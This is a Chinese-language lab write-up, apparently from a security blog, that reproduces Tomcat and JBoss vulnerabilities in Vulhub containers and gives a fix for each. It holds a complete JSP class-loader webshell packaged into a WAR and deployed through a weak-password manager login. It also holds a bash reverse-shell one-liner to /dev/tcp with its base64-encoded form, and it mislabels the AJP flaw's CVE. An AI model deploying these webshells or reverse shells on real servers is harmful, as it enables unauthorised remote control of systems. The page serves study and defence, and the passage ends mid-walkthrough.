<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506213431696.png" alt="image-20220506213431696"></p>
<p>但存在目录穿越</p>
<p>再次访问x.x.x.x&#x2F;files..&#x2F;</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506213535314.png" alt="image-20220506213535314"></p>
</li>
<li><p><strong>修复</strong></p>
<p>将files的使用闭合</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506213726896.png" alt="image-20220506213726896"></p>
</li>
</ul>
<h2 id="Tomcat漏洞"><a href="#Tomcat漏洞" class="headerlink" title="Tomcat漏洞"></a>Tomcat漏洞</h2><ul>
<li><p><strong>简介</strong></p>
<p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用  服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP  程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （  标准通用标记语言下的一个应用）页面的访问请求。<strong>实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat  时，它实际上作为一个与Apache 独立的进程单独运行的。</strong></p>
</li>
<li><p><strong>环境配置</strong></p>
<p>详细见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_37639863/article/details/122979472">kali 安装Vulhub靶场</a></p>
<p>利用vulhub靶场搭建</p>
<p>安装docker，docker-compose(<code>pip install docker-compose</code>)</p>
<p>下载vulhub,时间有点长</p>
<p><code>git clone https://github.com/vulhub/vulhub.git</code></p>
<p>进入vulhub中的漏洞目录用 <code>docker-compose up -d</code>启动</p>
</li>
<li><p><strong>常见目录</strong></p>
<p>bin	专门用来存放Tomcat服务器的可执行程序</p>
<p>conf	专门用来存放Tomcat服务器的配置文件</p>
<p>lib	专门用来存放Tomcat服务器的jar包</p>
<p>logs	专门用来存放Tomcat服务器运行时输出的日记信息</p>
<p>temp	专门用来存放Tomcat服务器运行时产生的临时数据</p>
<p>webapps	专门用来存放部署的web工程</p>
<p>work	Tomcat工作时的目录，用来存放Tomcat运行时jsp翻译为Servlet的源码，和Session钝化的目录。</p>
</li>
</ul>
<h3 id="Tomcat-任意文件写入-CVE-2017-12615"><a href="#Tomcat-任意文件写入-CVE-2017-12615" class="headerlink" title="Tomcat 任意文件写入(CVE-2017-12615)"></a>Tomcat 任意文件写入(CVE-2017-12615)</h3><ul>
<li><p><strong>介绍</strong></p>
<p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
<p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
</li>
<li><p><strong>复现</strong></p>
<ul>
<li><p><strong>开启容器</strong></p>
<p>在vulhub的<code>../vulhub/tomcat/CVE-2017-12615/</code>目录下使用<code>docker-compose up -d</code>开启容器</p>
<p>查看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507135815781.png" alt="image-20220507135815781"></p>
<p><code>docker ps</code>查看容器</p>
<p><code>docker -exec -it 容器id /bin/bash/</code>进去容器</p>
<p><code>cat conf/web.xml | grep readonly</code> 查看配置</p>
<p>readonly配置为false</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507135718177.png" alt="image-20220507135718177"></p>
</li>
<li><p><strong>利用</strong></p>
<p>bp抓包(我这是8080端口，会和bp初始端口冲突，需要换个端口监听)，把get改为put，上传文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507141453346.png" alt="image-20220507141453346"></p>
<p>查看文件目录 <code>ls /usr/local/tomcat/webapps/ROOT</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507141628460.png" alt="image-20220507141628460"></p>
<p>上传jsp文件，需要在jsp后加上%20，绕过后缀限制</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507141914909.png" alt="image-20220507141914909"></p>
</li>
</ul>
</li>
<li><p><strong>修复</strong></p>
<ol>
<li><p>升级版本</p>
</li>
<li><p>禁用PUT方法，其他的禁用见<a target="_blank" rel="noopener" href="https://blog.csdn.net/chou_qi/article/details/110459752">https://blog.csdn.net/chou_qi/article/details/110459752</a></p>
<p>在web.xml中添加</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span>    </span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span>    </span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>    </span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>PUT<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span>      </span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span>    </span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span>    </span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">login-config</span>&gt;</span>    </span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-method</span>&gt;</span>BASIC<span class="tag">&lt;/<span class="name">auth-method</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">login-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将readonly&#x3D;true(默认为true)</p>
</li>
</ol>
</li>
</ul>
<h3 id="Tomcat-远程代码执行（CVE-2019-0232）"><a href="#Tomcat-远程代码执行（CVE-2019-0232）" class="headerlink" title="Tomcat 远程代码执行（CVE-2019-0232）"></a>Tomcat 远程代码执行（CVE-2019-0232）</h3><ul>
<li><p><strong>介绍</strong></p>
<p>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有  webapp 目录下的任意文件，例如可以读取 webapp  配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害</p>
<p>影响范围：</p>
<ul>
<li>Apache Tomcat 9.x &lt; 9.0.31</li>
<li>Apache Tomcat 8.x &lt; 8.5.51</li>
<li>Apache Tomcat 7.x &lt; 7.0.100</li>
<li>Apache Tomcat 6.x</li>
</ul>
</li>
<li><p><strong>复现</strong></p>
<ul>
<li><p>利用vulhub搭建环境</p>
<p>在vulhub的<code>../vulhub/tomcat/CVE-2020-1938/</code>目录下使用<code>docker-compose up -d</code>开启容器<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507210241824.png" alt="image-20220507210241824"></p>
<p>访问127.0.0.1：8080</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507210110825.png" alt="image-20220507210110825"></p>
<p>成功开启</p>
</li>
<li><p><strong>验证</strong></p>
<p>poc测试<a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py%E4%B8%8B%E8%BD%BD">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py下载</a></p>
<p>直接运行poc，查看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507211526267.png" alt="image-20220507211526267"></p>
<p>在tomcat路径下创建一个php文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507213452754.png" alt="image-20220507213452754"></p>
<p>poc访问，读取源码</p>
</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507213503207.png" alt="image-20220507213503207"></p>
</li>
<li><p><strong>修复</strong></p>
<ol>
<li>临时禁用AJP协议端口，在conf&#x2F;server.xml配置文件中注释掉&lt;Connector port&#x3D;“8009” protocol&#x3D;”AJP&#x2F;1.3”redirectPort&#x3D;“8443” &#x2F;&gt;</li>
<li>更新tomcat版本</li>
</ol>
</li>
</ul>
<h3 id="Tomcat-弱口令-amp-后台war部署"><a href="#Tomcat-弱口令-amp-后台war部署" class="headerlink" title="Tomcat 弱口令&amp;后台war部署"></a>Tomcat 弱口令&amp;后台war部署</h3><ul>
<li><p><strong>介绍</strong></p>
<ul>
<li><p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下</p>
</li>
<li><p>登入后台界面可以爆破</p>
</li>
</ul>
</li>
<li><p><strong>复现</strong></p>
<ul>
<li><p>一样利用vulhub搭建环境</p>
<p>在vulhub的<code>../vulhub/tomcat/tomcat8/</code>目录下使用<code>docker-compose up -d</code>开启容器</p>
</li>
<li><p>访问后台界面<code>http://192.168.52.128:8080/manager/html</code>出现密码输入，抓包发现利用base64加密，可以尝试爆破；这里直接账户密码登入tomcat  tomcat</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507215143123.png" alt="image-20220507215143123"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507215205879.png" alt="image-20220507215205879"></p>
</li>
<li><p>进入后台</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507215429321.png" alt="image-20220507215429321"></p>
<p>先构建恶意war文件</p>
<p>创建jsp木马，密码为passwd</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>jsp打包 <code>jar cvf  shell.war shell.jsp</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507223513832.png" alt="image-20220507223513832"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507222102107.png" alt="image-20220507222102107"></p>
<p>上传war文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507221800227.png" alt="image-20220507221800227"></p>
<p>成功部署war</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507222213245.png" alt="image-20220507222213245"></p>
<p>打开<code>http://192.168.52.128:8080/shell/shell.jsp</code>，蚁剑连接</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507223959923.png" alt="image-20220507223959923"></p>
</li>
</ul>
</li>
<li><p><strong>修复</strong></p>
<ol>
<li><p>在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p>
</li>
<li><p>增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME&#x2F;conf&#x2F;web.xml文件设置锁定机制和时间超时限制。</p>
</li>
<li><p>以及针对manager-gui&#x2F;manager-status&#x2F;manager-script等目录页面设置最小权限访问限制。</p>
</li>
<li><p>后台管理避免弱口令。</p>
</li>
</ol>
</li>
</ul>
<h2 id="jBoss漏洞"><a href="#jBoss漏洞" class="headerlink" title="jBoss漏洞"></a>jBoss漏洞</h2><ul>
<li><p><strong>简介</strong></p>
<p>jBoss是一个基于J2EE的开发源代码的应用服务器。  JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB  2.0和EJB3的规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
</li>
<li><p><strong>环境搭建</strong></p>
<p>一样利用vulhub搭建环境</p>
</li>
</ul>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><h4 id="JBoss-lt-x3D-4-x-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504"><a href="#JBoss-lt-x3D-4-x-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504" class="headerlink" title="JBoss &lt;&#x3D;4.x JBossMQ JMS 反序列化漏洞(CVE-2017-7504)"></a>JBoss &lt;&#x3D;4.x JBossMQ JMS 反序列化漏洞(CVE-2017-7504)</h4><ul>
<li><p><strong>介绍</strong></p>
<p>Jboss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invoca Layer的HTTPServerLServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码</p>
<p>影响版本：JBoss 4.x以及之前的所有版本</p>
</li>
<li><p><strong>复现</strong></p>
<ul>
<li><p>一样利用vulhub搭建环境</p>
<p>在vulhub的<code>../vulhub/jboss/CVE-2017-7504/</code>目录下使用<code>docker-compose up -d</code>开启容器</p>
</li>
<li><p>访问<code>http://127.0.0.1:8080/jbossmq-httpil/HTTPServerILServlet</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508144953146.png" alt="image-20220508144953146"></p>
<p>存在反序列化漏洞</p>
</li>
<li><p>该漏洞为java反序列化，需要java环境</p>
<ul>
<li><p><strong>安装java环境，mvn，与java反序列工具</strong></p>
<p><strong>安装java</strong></p>
<p>用curl下载巨慢，建议利用proxychain代理，下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz</span><br><span class="line">tar zxvf jdk-8u20-linux-x64.tar.gz</span><br><span class="line">rm -rf /usr/bin/java*</span><br><span class="line">ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin</span><br><span class="line">javac -version</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<p>java环境搭建完成</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508150546350.png" alt="image-20220508150546350"></p>
<p><strong>安装mvn</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">wget http://mirrors.cnnic.cn/apache/maven/maven-3/3.5.4/binaries/apache-maven-3.5.4-bin.tar.gz#下载</span><br><span class="line">tar -zxvf apache-maven-3.5.4-bin.tar.gz#解压</span><br><span class="line">update-alternatives --install /usr/bin/mvn mvn /opt/apache-maven-3.5.4/bin/mvn #配置maven mvn</span><br><span class="line">vim /etc/profile #配置环境变量</span><br><span class="line">将</span><br><span class="line">export MAVEN_HOME=/opt/apache-maven-3.5.4</span><br><span class="line">export PATH=$MAVEN_HOME/bin:$PATH</span><br><span class="line">写入</span><br><span class="line">source /etc/profile #刷新</span><br><span class="line">mvn -version #查看</span><br></pre></td></tr></table></figure>

<p>配置完成</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508155004552.png" alt="image-20220508155004552"></p>
<p><strong>安装ysoserial反序列化工具</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/frohoff/ysoserial.git#下载</span><br></pre></td></tr></table></figure>

<p>在存在pom.xml的目录下运行，时间特长，最好开个代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>

<p>成功后</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508163414214.png" alt="image-20220508163414214"></p>
</li>
</ul>
</li>
<li><p><strong>开始复现</strong></p>
<p>先编写反弹shell的命令</p>
<p><code>bash -i &gt;&amp; /dev/tcp/192.168.52.128/1234 0&gt;&amp;1</code></p>
<p>并将其base64编码，绕过</p>
<p><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEyOC8xMjM0IDA+JjE=</code></p>
